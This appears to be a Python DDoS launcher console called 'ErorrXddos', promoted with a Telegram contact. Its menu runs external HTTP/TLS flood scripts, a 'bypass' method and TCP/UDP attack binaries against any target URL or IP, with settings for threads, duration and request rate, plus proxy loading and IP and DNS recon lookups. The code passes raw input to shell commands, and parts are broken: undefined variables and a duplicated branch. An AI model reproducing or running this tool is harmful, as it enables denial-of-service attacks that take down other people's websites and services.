
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    home()
    print(f'''
    
\033[1;32;40mTUNGGU SEBENTAR!!

    ''')
    time.sleep(1.0)
    clear()
    home()

###################################



###################################

def si(): 
    print('')
    print("")

###################################
def private():
    si()
    clear()
    home()
    print(f'''
\033[1;0;40m                                [ NOTE USE ]
\033[96m              ╚╦════════════════════════════════════════════╦╝
\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
\033[0m           NOTE USE : GET/POST
\033[94m           [ THREAD 500/150 ]   [ RPS 2/5 ]
\033[94m           [ TIME 50/150 ]
\033[94m           [ RATE 12/32 ]
\033[96m         ╚════════════════════════════════════════════════════════╝
\033[1;0;40m                             [ MENU METHODE ]
\033[96m              ╚╦════════════════════════════════════════════╦╝
\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
\033[95m           - RCX [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATE\033[95m] [\033[92mTHREAD\033[95m]
\033[96m         ╚════════════════════════════════════════════════════════╝

''')

###################################
def layer7():
    si()
    clear()
    home()
    print(f'''
\033[1;0;40m                               [ \033[92mLAYER - 7\033[0m ]

\033[1;0;40m                                [ NOTE USE ]
\033[96m              ╚╦════════════════════════════════════════════╦╝
\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
\033[0m           NOTE USE : GET/POST
\033[94m           [ THREAD 500/150 ]   [ RPS 2/5 ]
\033[94m           [ TIME 50/150 ]
\033[94m           [ RATE 12/32 ]
\033[96m         ╚════════════════════════════════════════════════════════╝
\033[1;0;40m                             [ MENU METHODE ]
\033[96m              ╚╦════════════════════════════════════════════╦╝
\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
\033[95m           - CRASH [\033[92mURL\033[95m] [\033[92mGET\033[95m]
\033[95m           - FXX [\033[92mURL\033[95m] [\033[92mGET\033[95m]
\033[95m           - TLS   [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATE\033[95m] [\033[92mTHREAD\033[95m]
\033[95m           - BYPASS [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
\033[95m           - BOMB [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
\033[95m           - MIX [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREADS\033[95m]
\033[95m           - TLSV2 [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRPS\033[95m] [\033[92mTHREAD\033[95m]
\033[95m           - CRT [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATELIMIT\033[95m] [\033[92mproxies.txt\033[95m] [\033[92mTHREADS\033[95m]
\033[95m           - HENTAI [\033[92mURL\033[95m] [\033[92mTIME\033[95m]
\033[96m         ╚════════════════════════════════════════════════════════╝

''')
###################################
def layer4():
    clear()
    si()
    home()
    print(f'''
\033[1;0;40m                              [ MENU METHODE ]
\033[1;0;40m                                [ LAYER - 4 ]
\033[96m              ╚╦════════════════════════════════════════════╦╝
\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
\033[95m           - udp
\033[95m           - tcp 
\033[96m         ╚════════════════════════════════════════════════════════╝
''')
###################################
def menu():
    sys.stdout.write(f"  \x1b]2;DDoS  --> Stars: [{bots}] | Online Users: [1] | Methods: [26] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("")
    print("""\033[92m
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠤⠖⠋⠉⠉⠉⠉⠙⠓⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠉⠀⠀⠀⠀⣠⡤⠤⠤⣤⣄⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⣠⠎⠁⠀⠀⠀⠀⠈⠙⢦⡀⠘⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⣀⡀⢄⣙⢦⡈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠈⢳⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢠⠀⠀⢰⡧⠊⠉⠀⠀⠀⠀⠀⣠⣾⣛⡷⢦⢸⡄⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣿⠀⠀⢸⠁⣠⣴⣦⡀⠀⠀⠀⠉⣿⣹⣧⠀⢸⠇⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⣿⠀⠀⢸⣾⠋⣿⢿⣧⠀⠀⠀⠀⠻⠧⠿⠀⠘⣷⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⢹⠀⠀⢸⣇⠀⢿⣿⣻⠇⠀⠀⠀⠀⠀⠀⠀⠀⣸⠂⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⢸⡀⠀⢸⣿⡆⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠄⠸⡇⠀⠈⡟⣷⣀⠀⠀⠀⠀⠀⠈⢀⣠⠴⢺⡇⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⣷⠀⠀⣷⠀⠉⠛⠒⠒⠒⣺⠿⠛⣷⢀⣸⡇⠀⣸⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠸⣇⠀⢸⡏⠉⠉⠹⡟⠚⠋⠀⠀⠉⠉⣿⠃⣠⠏⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⢻⣆⠀⢻⣄⠀⠀⢿⠀⠀⠀⠀⠀⠒⠗⣎⠁⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀		⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠈⣟⠳⣄⣙⣷⠶⣾⡀⠀⠀⠀⠀⠀⠀⠘⣶⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⢸⡄⠀⠀⢿⡀⠀⠀⠀⠀⠹⡇⠀⠀⠀⢦⠀⠀⠀⠹⣦⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣼⣟⣦⡀⠉⣷⡀⠀⠀⠀⠀⢿⠀⠀⠀⠈⢷⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⠀⢸⣧⠀⠀⠀⠀⠘⣧⠀⠀⠀⢸⡄⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀	⠀⠾⣏⣀⣸⠘⣧⡀⠀⠀⠀⣿⣷⣄⣀⣼⣁⣴⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣼⠀⠸⣷⠀⠀⠀⠸⡿⠿⠛⠛⣻⠛⠉⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠖⠋⠉⠉⠉⠀⠀⠀⠀⠘⣧⠀⠀⠀⠹⡄⠀⣴⠿⣇⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀	⠀⠀⣠⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⢻⡾⠃⠀⣿⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡄⠀⠀⠀⣿⠉⠉⢹⡆⠀⠀⢹⡦⠤⣄⡀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⣸⠋⠁⠀⠉⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣿⡀⠀⠀⢸⡄⠀⠀⣷⠀⠀⠸⡇⠀⠀⠙⢢⣄⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠛⠓⠒⠒⠶⠤⣄⣀⣀⣠⣴⠏⢷⡀⠀⠀⢷⠀⠀⠸⣆⠀⠀⣷⠀⠀⠀⠀⠹⡆⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢥⣀⠈⢷⡀⠀⠸⡆⠀⠀⠻⡆⠀⢹⠀⠀⠀⠀⢠⡟⠀⠀
		⠀⠀⠀⠀⠀⢀⡴⠖⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡌⢷⡀⠀⢻⡄⠀⠀⢻⠀⠸⢧⣀⠀⣠⡿⠁⠀⠀
		⠀⠀⣀⣠⠴⠋⠀⠀⠀⠘⢷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡶⢷⠀⠀⠻⣶⠶⢾⡄⠀⢀⣈⠙⠿⠷⢖⣦⣄
		⣠⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⢸⡆⠀⠀⣙⢧⡈⠛⠒⠒⠻⠽⠟⠉⠉⠉⠀
		⢿⣞⡤⠴⠖⠚⠛⠛⠛⠛⠓⠢⠤⢄⣉⠛⠓⠦⠤⢤⣄⣀⣀⣀⣀⡀⠀⠀⣾⠃⡼⡥⡤⣠⠸⡷⠽⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠶⠤⣤⣀⣈⣉⣁⣀⣤⠞⠁⢮⣺⣼⣱⢻⣇⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[95m                           [ BY : DDoS CYBER SCURITY ]
\033[95m                      [ SC : DDoS ]     [ USER : ADMIN ]
\033[1;32;95m                       TELEGRAM : @cekblokir   VERSION : 2.0

                   
    \033[1;32;93m   ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " \033[1;34;40mHELP \033[1;32;93m" ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
   \033[1;32;93m    ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " \033[1;34;40mInstall \033[1;32;93m" Untuk Install PIP COMMAND.
   
   """)
#########################################################
def home():
    sys.stdout.write(f"   \x1b]2;ErorrXddos  --> Stars: [{bots}] | Online Users: [1] | Methods: [26] | Bypass: [10] | Amps: [1]\x07")
    clear()
    si()
    print("")
    print("""\033[92m
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠤⠖⠋⠉⠉⠉⠉⠙⠓⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠉⠀⠀⠀⠀⣠⡤⠤⠤⣤⣄⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⣠⠎⠁⠀⠀⠀⠀⠈⠙⢦⡀⠘⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⣀⡀⢄⣙⢦⡈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠈⢳⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢠⠀⠀⢰⡧⠊⠉⠀⠀⠀⠀⠀⣠⣾⣛⡷⢦⢸⡄⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣿⠀⠀⢸⠁⣠⣴⣦⡀⠀⠀⠀⠉⣿⣹⣧⠀⢸⠇⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⣿⠀⠀⢸⣾⠋⣿⢿⣧⠀⠀⠀⠀⠻⠧⠿⠀⠘⣷⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⢹⠀⠀⢸⣇⠀⢿⣿⣻⠇⠀⠀⠀⠀⠀⠀⠀⠀⣸⠂⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⢸⡀⠀⢸⣿⡆⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠄⠸⡇⠀⠈⡟⣷⣀⠀⠀⠀⠀⠀⠈⢀⣠⠴⢺⡇⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⣷⠀⠀⣷⠀⠉⠛⠒⠒⠒⣺⠿⠛⣷⢀⣸⡇⠀⣸⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠸⣇⠀⢸⡏⠉⠉⠹⡟⠚⠋⠀⠀⠉⠉⣿⠃⣠⠏⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⢻⣆⠀⢻⣄⠀⠀⢿⠀⠀⠀⠀⠀⠒⠗⣎⠁⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀                ⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠈⣟⠳⣄⣙⣷⠶⣾⡀⠀⠀⠀⠀⠀⠀⠘⣶⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⢸⡄⠀⠀⢿⡀⠀⠀⠀⠀⠹⡇⠀⠀⠀⢦⠀⠀⠀⠹⣦⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣼⣟⣦⡀⠉⣷⡀⠀⠀⠀⠀⢿⠀⠀⠀⠈⢷⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⠀⢸⣧⠀⠀⠀⠀⠘⣧⠀⠀⠀⢸⡄⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠾⣏⣀⣸⠘⣧⡀⠀⠀⠀⣿⣷⣄⣀⣼⣁⣴⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣼⠀⠸⣷⠀⠀⠀⠸⡿⠿⠛⠛⣻⠛⠉⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠖⠋⠉⠉⠉⠀⠀⠀⠀⠘⣧⠀⠀⠀⠹⡄⠀⣴⠿⣇⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⣠⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⢻⡾⠃⠀⣿⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡄⠀⠀⠀⣿⠉⠉⢹⡆⠀⠀⢹⡦⠤⣄⡀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⣸⠋⠁⠀⠉⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣿⡀⠀⠀⢸⡄⠀⠀⣷⠀⠀⠸⡇⠀⠀⠙⢢⣄⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠛⠓⠒⠒⠶⠤⣄⣀⣀⣠⣴⠏⢷⡀⠀⠀⢷⠀⠀⠸⣆⠀⠀⣷⠀⠀⠀⠀⠹⡆⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢥⣀⠈⢷⡀⠀⠸⡆⠀⠀⠻⡆⠀⢹⠀⠀⠀⠀⢠⡟⠀⠀
                ⠀⠀⠀⠀⠀⢀⡴⠖⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡌⢷⡀⠀⢻⡄⠀⠀⢻⠀⠸⢧⣀⠀⣠⡿⠁⠀⠀
                ⠀⠀⣀⣠⠴⠋⠀⠀⠀⠘⢷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡶⢷⠀⠀⠻⣶⠶⢾⡄⠀⢀⣈⠙⠿⠷⢖⣦⣄
                ⣠⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⢸⡆⠀⠀⣙⢧⡈⠛⠒⠒⠻⠽⠟⠉⠉⠉⠀
                ⢿⣞⡤⠴⠖⠚⠛⠛⠛⠛⠓⠢⠤⢄⣉⠛⠓⠦⠤⢤⣄⣀⣀⣀⣀⡀⠀⠀⣾⠃⡼⡥⡤⣠⠸⡷⠽⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠶⠤⣤⣀⣈⣉⣁⣀⣤⠞⠁⢮⣺⣼⣱⢻⣇⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[95m                       [ BY : DDoS CYBER SCURITY ]
\033[95m                   [ SC : DDoS ]     [ USER : ADMIN ]
\033[95m                    TELEGRAM : @cekblokir   VERSION : 2.0
                   """)
 
#########################################################

def main():
    menu()
    while(True):
        cnc = input('''\033[0;37;45mRoot@ErorrXddos\033[1;0;40m: ~# ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "private" or cnc == "PRIVATE" or cnc == "PRIV" or cnc == "p":
             private()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "home":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "install" or cnc == "INSTALL" or cnc == "instal" or cnc == "INSTALL":
            os.system(f'python3 install.py')
            main()
            

############# LAYER 7 #################

        elif "CRASH" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: CRASH <url> METHODS<GET/POST>')
                print('Example: CRASH http://example.com GET')
                print('\n')

        elif "CRT" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run TLS.go -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: CRT <url> <time> <ratelimit> <proxies.txt> <threads>')
                print('Example: CRT http://example.com 244 4 proxies.txt 1500')
                print('\n')

        elif "HENTAI" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'go run hentai.go -host {url} -time {time}')
            except IndexError:
                print('Usage: HENTAI <url> <time>')

        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'python bypass.py -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: BYPASS <url> METHODS<GET/POST>')
                print('Example: BYPASS http://example.com 1500 200')
                print('\n')

        elif "MIX" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'node MIXMAX.js -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: MIX <HOST> <TIME> <RPS> <THREADS>')
                print('Example: MIX http://example.com 244 5 150')
                print('\n')

        elif "FXX" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run tlsv2.go -site {url} -data {method}')
            except IndexError:
                print('\n')
                print('Usage: FXX <url> METHODS<GET/POST>')
                print('Example: FXX http://example.com GET')

        elif "TLSV2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node TLS-V2.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: TLS-V2 <url> <time> <rps> <thread>')
                print('\n')
                
        elif "BOMB" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node spike.js {url} {thread} {time}')
            except IndexError:
                print('\n')
                print('Usage: BOMB.js <url> <threads> <time>')
                print('Example: BOMB http://example.com 1500 150')
                print('\n')

        elif "HENTAI" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'go run hentai.go -host {url} -time {time}')
            except IndexError:
                print('Usage: HENTAI <url> <time>')
                
                
        elif "TLS" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4] 
                os.system(f'node TLS-SUPERV2.js {ip} {time} {rate} {thread} proxies.txt')
            except IndexError:
                print('\nUsage: TLS <target> <time> <rate(32> <thread>')
                print('Example: TLS https://example.com 150 32 4000\n\n')

        elif "git" in cnc:
            try:
                git = cnc.split()[1]
                os.system(f'git clone {git}')
            except IndexError:
                print('\nUsage: git clone <link>')
                print('Example: git clone https://github.com/CikoViko/ErorrXddos\n\n')

############# LAYER 4 #################

        elif "autobypass" in cnc:
            try:
                tcp = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./AUTOBYPASS {tcp} {ip} {port} {time}')
            except IndexError:
                print('Usage: autobypass <tcp> <ip> <port> <time>')

############# PRIVATE #############

        elif "RCX" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node NOX.js {url} {time} {thread} {rps} {proxy}')
            except IndexError:
                print('Usage: RCX <url> <time> <thread> <rps> <proxy>')

############# TOOLS #################
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')
                
        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('\nUsage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8 \n  ')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            clear()
            home()
            print(f'''
\033[95m	                  [ \033[92mMENU METHOD & LAYER\033[95m ]
\033[96m              ╚╦════════════════════════════════════════════╦╝
\033[96m         ╔═════╩════════════════════════════════════════════╩═════╗
\033[95m             [\033[94m LAYER - 7\033[95m ]      [\033[94m LAYER - 4\033[95m ]      [\033[94m PRIVATE\033[95m ]

\033[95m             • CRASH            • UDP              •  RCX [\033[92mVIP\033[95m]
\033[95m             • FXX              • TCP
